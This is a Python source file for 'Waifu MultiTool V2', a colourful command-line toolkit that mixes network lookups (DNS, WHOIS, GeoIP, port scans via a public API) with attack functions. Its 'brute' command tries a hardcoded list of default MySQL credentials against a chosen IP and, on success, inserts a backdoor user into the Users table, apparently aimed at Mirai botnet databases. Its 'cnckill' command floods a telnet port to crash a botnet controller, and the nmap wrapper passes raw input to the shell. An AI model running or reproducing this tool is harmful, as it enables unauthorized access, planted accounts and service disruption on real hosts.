# Waifu MultiTool V2
import string
import subprocess
import sys
import os
import socket
import requests
from colored import fg, attr
from random import *
from time import sleep
import datetime as dt

# VALID COMMANDS
COMMANDS = ["pw", "help", "?", "cnckill", "brute", "ping", "portscan", "dns", "exit", "cls", "clear", "geoip", "banner",
            "asn", "whois", "nmap", "NMAP"]

win = "Windows"
unix = "Unix"

newprompt = True

creds = """
root:botnet
root:admin
admin:admin
root:123456
root:54321
root:
admin:password
root:12345
admin:
root:pass
root:password
admin:admin1234
root:1111
admin:1111
root:password
root:1234
root:user
admin:1234
admin:12345
admin:54321
admin:123456
admin:1234
admin:pass
"""

if os.name == "nt":
    OS = "Windows"
else:
    OS = "Unix"


def print_banner():
    global newprompt
    newprompt = True
    if OS == win:
        os.system("cls")
    else:
        os.system("clear")
    localip = socket.gethostbyname(socket.gethostname())
    print('%s      __      __                   ___             __  __          __      %s' % (fg(randrange(170, 171)), attr(0)))
    print("%s      /\ \  __/\ \            __  /'___\           /\ \/\ \        /\ \__    %s" % (fg(randrange(170, 171)), attr(0)))
    print("%s      \ \ \/\ \ \ \     __   /\_\/\ \__/  __  __   \ \ ` \\ \     __\ \ ,_\  %s" % (fg(randrange(170, 171)), attr(0)))
    print("%s       \ \ \ \ \ \ \  /'__`\ \/\ \ \ ,__\/\ \/\ \   \ \ , ` \  /'__`\ \ \/   %s" % (fg(randrange(170, 171)), attr(0)))
    print("%s        \ \ \_/ \_\ \/\ \L\.\_\ \ \ \ \_/\ \ \_\ \   \ \ \`\ \/\  __/\ \ \_  %s" % (fg(randrange(170, 171)), attr(0)))
    print("%s         \  \___x___/\ \__/.\_\\\_\ \_\ \  \\ \____/    \_\ \_\ \ \___\ \__\ %s" % (fg(randrange(170, 171)), attr(0)))
    print("%s          \/__//___/  \/__/\/_/ \/_/\/_/   \/___/      \/_/\/_/\/____/ \/__/ %s" % (fg(randrange(170, 171)), attr(0)))
    print("%s      --------------------------------------- %s" % (fg(randrange(170, 171)), attr(0)))
    print("%s     | Type%s Help%s Or %s?%s For A List Of Commands | %s " % (fg(171), fg(171), fg(171), fg(171), fg(171), attr(0)))
    print("%s      --------------------------------------- %s" % (fg(randrange(170, 171)), attr(0)))
    print("%s     | My TikTok:%s vl_accurxte |        %s" % (fg(171), fg(171), attr(0)))
    print("%s      ------------------------ %s" % (fg(randrange(170, 171)), attr(0)))

def request_info(url):
    request = requests.get(url)
    response = request.text
    for line in response.splitlines():
        print(f'%s   ╠[%s+%s]%s{line}' % (fg(171), fg(171), fg(171), fg(171)))


def help():
    global newprompt
    print(
        "      %s╠═════════════════════════════════[%s+%s][%sFEATURES%s][%s+%s]════════════════════════════════════════╗%s" % (
        fg(171), fg(171), fg(171), fg(171), fg(171), fg(171), fg(171), attr(0)))
    print("      %s╟ %sPING %s- %sFast ICMP Pinger                                                                 ║%s" % (
    fg(171), fg(171), fg(171), fg(171), attr(0)))
    print("      %s╟ %sPORTSCAN %s- %sSimple TCP Portscanner                                                       ║%s" % (
    fg(171), fg(171), fg(171), fg(171), attr(0)))
    print(   "      %s╟%s %sNMAP %s- %sAdvanced Portscanner                                                             ║%s" % (
    fg(171), fg(171), fg(171), fg(171), fg(171), attr(0)))
    print(   "      %s╟%s %sBRUTE %s- %sBrute Mirai SQL Database To Gain Access                                         ║%s" % (
    fg(171), fg(171), fg(171), fg(171), fg(171), attr(0)))
    print(   "      %s╟%s %sCNCKILL %s- %sAttempts To Kill A Mirai CNC                                                  ║%s" % (
    fg(171), fg(171), fg(171), fg(171), fg(171), attr(0)))
    print(   "      %s╟%s %sPW %s- %sSecure Password Generator                                                          ║%s" % (
    fg(171), fg(171), fg(171), fg(171), fg(171), attr(0)))
    print("      %s╟ %sDNS%s - %sDNS Lookup                                                                        ║%s" % (
    fg(171), fg(171), fg(171), fg(171), attr(0)))
    print("      %s╟ %sGEOIP %s-%s GEO IP Lookup                                                                   ║%s" % (
    fg(171), fg(171), fg(171), fg(171), attr(0)))
    print("      %s╟ %sBANNER %s- %sGRAB BANNER                                                                    ║%s" % (
    fg(171), fg(171), fg(171), fg(171), attr(0)))
    print("      %s╟ %sASN%s - %sASN LOOKUP                                                                        ║%s" % (
    fg(171), fg(171), fg(171), fg(171), attr(0)))
    print("      %s╟ %sWHOIS %s- %sDomain WHOIS Lookup                                                             ║%s" % (
    fg(171), fg(171), fg(171), fg(171), attr(0)))
    print("      %s╟ %sCLS %s- %sClear Screen                                                                      ║%s" % (
    fg(171), fg(171), fg(171), fg(171), attr(0)))
    print("      %s╟ %sEXIT %s- %sQuit Waifu MultiTool V2                                                          ║%s" % (
    fg(171), fg(171), fg(171), fg(171), attr(0)))
    print("      %s╠═════════════════════════════════════════════════════════════════════════════════════════╝%s" % (
    fg(171), attr(0)))
    newprompt = False


def check_ip(ip):
    i = 0
    ip_valid = True
    for element in ip:
        if element == '.':
            i += 1
        else:
            try:
                int(element)
            except:
                ip_valid = False
                pass
    if not i == 3:
        ip_valid = False
    return ip_valid


def check_yesno(str):
    if str.lower() == 'y':
        return True
    if str.lower() == 'n':
        return False
    else:
        return None


def tcpportscan(ip):
    url = f"https://api.hackertarget.com/nmap/?q={ip}"
    response = requests.get(url)
    if response.status_code == 200:
        request_info(url)
    else:
        print("   %s╠[%s+%s]%sAPI Error! %sCheck Your Internet Connection And Try Again.%s" % (
        fg(171), fg(171), fg(171), fg(171), fg(171), attr(0)))


def cnckill(ip, port):
    payload = 'fuckyouskid' * 10000
    try:
        import telnetlib
    except:
        install = input("   %s╠[%s+%s]%sMissing Module Telnetlib! %sAttempt To Install? [Y/N]%s" % (
        fg(171), fg(171), fg(171), fg(171), fg(171), attr(0)))
        if 'y' in install.lower():
            os.system('pip install telnetlib')
            os.system('pip install telnetlib3')
        return
    try:
        tn = telnetlib.Telnet(ip, port)
    except:
        print("   %s╠[%s+%s]%sCould Not Connect! %sPlease Check The Info And Your Internet Connetion.%s" % (
        fg(171), fg(171), fg(171), fg(171), fg(171), attr(0)))
        return
    try:
        tn.write(payload.encode('ascii') + b"\n")
        tn.close()
    except:
        pass
    try:
        sleep(3)
        tn2 = telnetlib.Telnet(ip, port)
    except:
        print(f"   %s╠[%s+%s]%s CNC Killed!" % (fg(171), fg(171), fg(171), fg(171)))
        return
    print("   %s╠[%s+%s]%sExploit Failed! %sTry Another One%s" % (fg(171), fg(171), fg(171), fg(171), fg(171), attr(0)))


def dns(domain):
    url = f"https://api.hackertarget.com/dnslookup/?q={domain}"
    response = requests.get(url)
    if response.status_code == 200:
        request_info(url)
    else:
        print("   %s╠[%s+%s]%sAPI Error! %sCheck Your Internet Connection And Try Again.%s" % (
        fg(171), fg(171), fg(171), fg(171), fg(171), attr(0)))


def bannergrab(ip):
    url = f"https://api.hackertarget.com/bannerlookup/?q={ip}"
    response = requests.get(url)
    if response.status_code == 200:
        request_info(url)
    else:
        print("   %s╠[%s+%s]%sAPI Error! %sCheck Your Internet Connection And Try Again.%s" % (
        fg(171), fg(171), fg(171), fg(171), fg(171), attr(0)))


def brute(ip):
    try:
        import pymysql
    except:
        install = input("   %s╠[%s+%s]%sMissing Module PyMySQL! %sAttempt To Install? [Y/N]%s" % (
        fg(171), fg(171), fg(171), fg(171), fg(171), attr(0)))
        if 'y' in install.lower():
            os.system('pip install pymysql')
        return
    try:
        print("   %s╠[%s+%s]%s Attempting To Brute SQL Server..." % (fg(171), fg(171), fg(171), fg(171)))

        conn = pymysql.connect(host=ip, user='root', password='root', charset='utf8mb4',
                               cursorclass=pymysql.cursors.DictCursor, read_timeout=5, write_timeout=5,
                               connect_timeout=5)
        cursor = conn.cursor()
        print(f"   %s╠[%s+%s]%s Login Successfull!" % (fg(171), fg(171), fg(171), fg(171)))
        cursor.execute('Show Databases')
        for a_dict in cursor.fetchall():
            for db in a_dict:
                try:
                    cursor.execute(f'use {a_dict[db]};')
                    print("   %s╠[%s+%s]%s Attempting To Inject To Table Users..." % (fg(171), fg(171), fg(171), fg(171)))
                    cursor.execute("INSERT INTO Users VALUES (NULL, 'ipdowned', 'isaskid', 0, 0, 0, 0, -1, 1, 30, '');")
                    print(f"   %s╠[%s+%s]%s Success On {ip} Username: ipdowned Password: isaskid" % (
                    fg(171), fg(171), fg(171), fg(171)))
                    return
                except:
                    pass
    except Exception as e:
        if 'Access denied' in str(e):
            for combo in creds.splitlines():
                if combo == '':
                    continue
                uname = combo[:combo.index(':')]
                try:
                    password = combo[combo.index(':') + 1:]
                except ValueError:
                    password = ''
                try:
                    print(f"   %s╠[%s+%s]%s Trying {uname}:{password}" % (fg(171), fg(171), fg(171), fg(171)))
                    conn = pymysql.connect(host=ip, user=uname, password=password, charset='utf8mb4',
                                           cursorclass=pymysql.cursors.DictCursor, read_timeout=5, write_timeout=5,
                                           connect_timeout=5)
                    print(f"   %s╠[%s+%s]%s Login Successfull!" % (fg(171), fg(171), fg(171), fg(171)))
                    cursor = conn.cursor()
                    cursor.execute('show databases')
                    for a_dict in cursor.fetchall():
                        for db in a_dict:
                            try:
                                cursor.execute(f'use {a_dict[db]};')
                                print("   %s╠[%s+%s]%s Attempting To Inject To Table Users..." % (
                                fg(171), fg(171), fg(171), fg(171)))
                                cursor.execute(
                                    "INSERT INTO Users VALUES (NULL, 'ipdowned', 'isaskid', 0, 0, 0, 0, -1, 1, 30, '');")
                                print(f"   %s╠[%s+%s]%s Success on {ip} Username: ipdowned Password: isaskid" % (
                                fg(171), fg(171), fg(171), fg(171)))
                                return
                            except:
                                pass
                except:
                    pass
        else:
            pass
    print("   %s╠[%s+%s]%sBrute Failed! %sTry Another One%s" % (fg(171), fg(171), fg(171), fg(171), fg(171), attr(0)))


def geoip(ip):
    url = f"https://api.hackertarget.com/geoip/?q={ip}"
    response = requests.get(url)
    if response.status_code == 200:
        request_info(url)
    else:
        print("   %s╠[%s+%s]%sAPI Error! %sCheck Your Internet Connection And Try Again.%s" % (
        fg(171), fg(171), fg(171), fg(171), fg(171), attr(0)))


def whoislookup(domain):
    url = f"https://api.hackertarget.com/whois/?q={domain}"
    response = requests.get(url)
    if response.status_code == 200:
        request_info(url)
    else:
        print("   %s╠[%s+%s]%sAPI Error! %sCheck Your Internet Connection And Try Again.%s" % (
        fg(171), fg(171), fg(171), fg(171), fg(171), attr(0)))


def asntoip(asn):
    url = f"https://api.hackertarget.com/aslookup/?q={asn}"
    response = requests.get(url)
    if response.status_code == 200:
        request_info(url)
    else:
        print("   %s╠[%s+%s]%sAPI Error! %sCheck Your Internet Connection And Try Again.%s" % (
        fg(171), fg(171), fg(171), fg(171), fg(171), attr(0)))


def iptoasn(ip):
    url = f"https://api.hackertarget.com/aslookup/?q={ip}"
    response = requests.get(url)
    if response.status_code == 200:
        request_info(url)
    else:
        print("   %s╠[%s+%s]%sAPI Error! %sCheck Your Internet Connection And Try Again.%s" % (
        fg(171), fg(171), fg(171), fg(171), fg(171), attr(0)))


def ping(ip):
    while not check_ip(ip):
        ip = input("   %s╠[%s+%s]%sInvalid IP Address. %sEnter A Valid IP: %s" % (
        fg(171), fg(171), fg(171), fg(171), fg(171), attr(0)))
    print("   %s╠[%s+%s]%sCTRL+C %sTo Stop Pinging" % (fg(171), fg(171), fg(171), fg(171), fg(171)))
    sleep(0.5)
    if OS == win:
        while True:
            try:
                subprocess.check_call(f"PING {ip} -n 1 | FIND \"TTL=\" > NUL", shell=True)
                print(f'   %s╠[%s+%s] Reply From %s{ip}' % (fg(171), fg(171), fg(171), fg(171)))
            except subprocess.CalledProcessError:
                print(f"   %s╠[%s+%s]%s{ip} %sGot Hit Offline%s" % (fg(171), fg(171), fg(171), fg(171), fg(171), attr(0)))
            except KeyboardInterrupt:
                break
    else:
        while True:
            try:
                subprocess.check_call(f"PING {ip} -c1 > /dev/null 2>&1", shell=True)
                print(f'   %s╠[%s+%s] Reply From %s{ip}' % (fg(171), fg(171), fg(171), fg(171)))
            except subprocess.CalledProcessError:
                print(f"   %s╠[%s+%s]%s{ip} %sGot Hit Offline%s" % (fg(171), fg(171), fg(171), fg(171), fg(171), attr(0)))
            except KeyboardInterrupt:
                break


def nmap():
    global newprompt
    if os.system('nmap > nul 2>&1') == 1:
        defaultpath = repr('C:\Program Files (x86)\nmap')
        print(f"   %s╠[%s+%s]                  You Do Not Have NMAP Installed Or It Is Not Added To The PATH" % (
        fg(171), fg(171), fg(171)))
        print(f"   %s╠[%s+%s]                  " % (fg(171), fg(171), fg(171)))
        print(f"   %s╠[%s+%s]                  ---------------NMAP WINDOWS INSTALL TUTORIAL----------------" % (
        fg(171), fg(171), fg(171)))
        print(
            f"   %s╠[%s+%s]                  [1] Download The Latest Version Of NMAP From https://nmap.org/download.html" % (
            fg(171), fg(171), fg(171)))
        print(f"   %s╠[%s+%s]                  Look For Latest Stable Release Under Windows Binaries" % (
        fg(171), fg(171), fg(171)))
        print(
            f"   %s╠[%s+%s]                  [2] Go Through The Install Process And Take Note Of Where NMAP Is Installed To." % (
            fg(171), fg(171), fg(171)))
        print(f"   %s╠[%s+%s]                  By Default It Should Be {defaultpath}" % (fg(171), fg(171), fg(171)))
        print(
            f"   %s╠[%s+%s]                  [3] Go To Control Panel > System And Security > System > Advanced System Settings" % (
            fg(171), fg(171), fg(171)))
        print(f"   %s╠[%s+%s]                  > Environment Variables" % (fg(171), fg(171), fg(171)))
        print(
            f"   %s╠[%s+%s]                  [4] Look At The Box Labeled System Variables And Double Click On Path" % (
            fg(171), fg(171), fg(171)))
        print(
            f"   %s╠[%s+%s]                  [5] Hit New And Enter The Location Where NMAP Is Installed To ({defaultpath})" % (
            fg(171), fg(171), fg(171)))
        print(
            f"   %s╠[%s+%s]                  [6] Open A New Command Prompt Window And Enter 'NMAP'. If It Gives You The NMAP Options" % (
            fg(171), fg(171), fg(171)))
        print(f"   %s╠[%s+%s]                  You Are Done!" % (fg(171), fg(171), fg(171)))
    else:
        print(f"   %s╠[%s+%s]%s [Enter Command Or Type -Help For Help]" % (fg(171), fg(171), fg(171), fg(171)))
        pscan = input(f"   %s╠[%s+%s]%s nmap,NMAP " % (fg(171), fg(171), fg(171), fg(171))).strip()
        os.system(f'nmap {pscan}')
        newprompt = True


def pw():
    try:
        characters = string.ascii_letters + string.punctuation + string.digits
        password = "".join(choice(characters) for x in range(randint(10, 20)))
        print(f"   %s╠[%s+%s]%sYour Password Is:%s {password}" % (fg(171), fg(171), fg(171), fg(171), fg(171)))
        save = input(f"   %s╠[%s+%s]%s Would You Like To Save Your Password? [Y/N] :" % (fg(171), fg(171), fg(171), fg(171)))
        while not save.lower() in ['y', 'n', 'yes', 'no']:
            save = input(f"   %s╠[%s+%s]%s Invalid Choice. Would You Like To Save Your Password? [Y/N] :" % (
            fg(171), fg(171), fg(171), fg(171)))
        if save.lower() == 'y' or save.lower() == 'yes':
            label = input(f"   %s╠[%s+%s]%s Enter A Label For This Password? :" % (fg(171), fg(171), fg(171), fg(171)))
            f = open("passwords.txt", "a")
            f.write(f"[{dt.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Password For {label} : {password}\r\n")
            f.close()
            print("   %s╠[%s+%s]%s Password Saved To passwords.txt" % (fg(171), fg(171), fg(171), fg(171)))
    except KeyboardInterrupt:
        print('')
        pass


def take_commands():
    global newprompt
    if newprompt:
        newprompt = False
        command = input("%s%s%s      %sWaifu%s@%sTerminal%s ~%s" % (
        fg(171), fg(171), fg(171), fg(171), fg(171), fg(171), fg(171), attr(0))).lower()
    else:
        command = input("%s%s%s      %sWaifu%s@%sTerminal%s ~%s" % (
        fg(171), fg(171), fg(171), fg(171), fg(171), fg(171), fg(171), attr(0))).lower()
    if command not in COMMANDS:
        print("   %s╠[%s+%s]%sInvalid Command. %sType %s?%s Or %sHelp%s For A List Of Commands %s" % (
        fg(171), fg(171), fg(171), fg(171), fg(171), fg(171), fg(171), fg(171), fg(171), attr(0)))
        take_commands()
    if command == "ping":
        try:
            ip = input("   %s╠[%s+%s]%sEnter IP Address:" % (fg(171), fg(171), fg(171), fg(171)))
            while not check_ip(ip):
                ip = input("   ╠[+]Invalid IP Address. Enter Valid IP:")
            ping(ip)
        except KeyboardInterrupt:
            print('')
            pass
    elif command == "portscan":
        try:
            ip = input("   %s╠[%s+%s]%sEnter IP Address:" % (fg(171), fg(171), fg(171), fg(171)))
            while not check_ip(ip):
                ip = input("   %s╠[%s+%s]%sInvalid IP Address. %sEnter A Valid IP: %s" % (
                fg(171), fg(171), fg(171), fg(171), fg(171), attr(0)))
            tcpportscan(ip)
        except KeyboardInterrupt:
            print('')
            pass
    elif command == "pw":
        pw()
    elif command == "asn":
        try:
            print("   %s╠[%s+%s]%sSelect 1 or 2:" % (fg(171), fg(171), fg(171), fg(171)))
            print("   %s╠[%s+%s]%s1. IP TO ASN" % (fg(171), fg(171), fg(171), fg(171)))
            print("   %s╠[%s+%s]%s2. ASN TO IP" % (fg(171), fg(171), fg(171), fg(171)))
            choice = input("   %s╠[%s+%s]%s: " % (fg(171), fg(171), fg(171), fg(171)))
            while not choice in ['1', '2']:
                choice = input("   %s╠[%s+%s]%sInvalid Choice. %sChoose 1 or 2: %s" % (
                fg(171), fg(171), fg(171), fg(171), fg(171), attr(0)))
            if choice == '1':
                ip = input("   %s╠[%s+%s]%sEnter IP Address:" % (fg(171), fg(171), fg(171), fg(171)))
                while not check_ip(ip):
                    ip = input("   %s╠[%s+%s]%sInvalid IP Address. %sEnter A Valid IP: %s" % (
                    fg(171), fg(171), fg(171), fg(171), fg(171), attr(0)))
                iptoasn(ip)
            else:
                asn = input("   %s╠[%s+%s]%sEnter ASN:" % (fg(171), fg(171), fg(171), fg(171)))
                asntoip(asn)
        except KeyboardInterrupt:
            print('')
            pass
    elif command == "whois":
        try:
            domain = input("   %s╠[%s+%s]%sEnter Domain:" % (fg(171), fg(171), fg(171), fg(171)))
            whoislookup(domain)
        except KeyboardInterrupt:
            print('')
            pass
    elif command == "dns":
        try:
            domain = input("   %s╠[%s+%s]%sEnter Domain:" % (fg(171), fg(171), fg(171), fg(171)))
            dns(domain)
        except KeyboardInterrupt:
            print('')
            pass
    elif command == "geoip":
        try:
            ip = input("   %s╠[%s+%s]%sEnter IP Address:" % (fg(171), fg(171), fg(171), fg(171)))
            while not check_ip(ip):
                ip = input("   %s╠[%s+%s]%sInvalid IP Address. %sEnter A Valid IP: %s" % (
                fg(171), fg(171), fg(171), fg(171), fg(171), attr(0)))
            geoip(ip)
        except KeyboardInterrupt:
            print('')
            pass
    elif command == "cnckill":
        try:
            ip = input("   %s╠[%s+%s]%sEnter Botnet IP Address:" % (fg(171), fg(171), fg(171), fg(171)))
            while not check_ip(ip):
                ip = input("   %s╠[%s+%s]%sInvalid IP Address. %sEnter A Valid IP: %s" % (
                fg(171), fg(171), fg(171), fg(171), fg(171), attr(0)))
            port = input("   %s╠[%s+%s]%sEnter Botnet Port:" % (fg(171), fg(171), fg(171), fg(171))).strip()
            try:
                while not int(port) in range(1, 65536):
                    port = input("   %s╠[%s+%s]%sPort Must Be Between 1 And 65535:" % (fg(171), fg(171), fg(171), fg(171)))
                cnckill(ip, port)
            except:
                print("   %s╠[%s+%s]%sInvalid Port!" % (fg(171), fg(171), fg(171), fg(171)))
                pass
        except KeyboardInterrupt:
            print('')
            pass
    elif command == "brute":
        try:
            ip = input("   %s╠[%s+%s]%sEnter IP Address:" % (fg(171), fg(171), fg(171), fg(171)))
            while not check_ip(ip):
                ip = input("   %s╠[%s+%s]%sInvalid IP Address. %sEnter A Valid IP: %s" % (
                fg(171), fg(171), fg(171), fg(171), fg(171), attr(0)))
            brute(ip)
        except KeyboardInterrupt:
            print('')
            pass
    elif command == "banner":
        try:
            ip = input("   %s╠[%s+%s]%sEnter IP Address:" % (fg(171), fg(171), fg(171), fg(171)))
            while not check_ip(ip):
                ip = input("   %s╠[%s+%s]%sInvalid IP Address. %sEnter A Valid IP: %s" % (
                fg(171), fg(171), fg(171), fg(171), fg(171), attr(0)))
            bannergrab(ip)
        except KeyboardInterrupt:
            print('')
            pass
    elif command == "help":
        help()
    elif command == "nmap":
        nmap()
    elif command == "?":
        help()
    elif command == "clear":
        print_banner()
    elif command == "cls":
        print_banner()
    elif command == "exit":
        sys.exit("   %s╠[%s+%s]%sGoodbye" % (fg(171), fg(171), fg(171), fg(171)))
    elif command == "quit":
        sys.exit("   %s╠[%s+%s]%sGoodbye%s" % (fg(171), fg(171), fg(171), fg(171), attr(0)))


print_banner()
if OS == win:
    os.system("title Waifu MultiTool V2")
while True:
    try:
        take_commands()
    except KeyboardInterrupt:
        print('')
        pass